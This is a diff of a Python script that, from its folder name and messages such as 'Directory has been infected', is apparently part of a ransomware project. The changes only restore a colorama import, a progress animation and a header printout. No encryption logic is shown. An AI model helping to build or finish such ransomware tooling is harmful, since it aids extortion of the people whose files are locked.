@@ -1,6 +1,6 @@
 from base64 import b64encode, b64decode
 from threading import Thread
-import encryption, constants, os, json, cryptools, time, sys # colorama
+import encryption, constants, os, json, cryptools, time, sys, colorama
 
 
 '''
@@ -20,11 +20,11 @@ def main():
 
 	global repeat
 
-	#animation = Thread(target=cinematics)
+	animation = Thread(target=cinematics)
 
-	#printheader()
+	printheader()
 
-	#animation.start()
+	animation.start()
 
 	folder_path = '..'
 
@@ -79,8 +79,6 @@ def main():
 
 	repeat = False
 
-'''
-Works for Python2
 def cinematics():
 	while repeat:
 		if progressbar:
@@ -96,14 +94,12 @@ def cinematics():
 	os.chdir('..')
 	sys.stdout.write('\b \n\n' + colorama.Style.RESET_ALL + 'Directory has been ' + colorama.Fore.RED + 'infected' + colorama.Style.RESET_ALL + '\n\n')
 	sys.stdout.write(colorama.Style.RESET_ALL)
-'''
-'''
+
 def printheader():
 	os.chdir('..')
 	sys.stdout.write('\nInfecting Directory: ' + colorama.Fore.GREEN + os.getcwd() + '...  ')
 	sys.stdout.flush()
 	sys.stdout.write(colorama.Style.RESET_ALL)
 	os.chdir('ransomware')
-'''
 if __name__ == '__main__':
 	main()
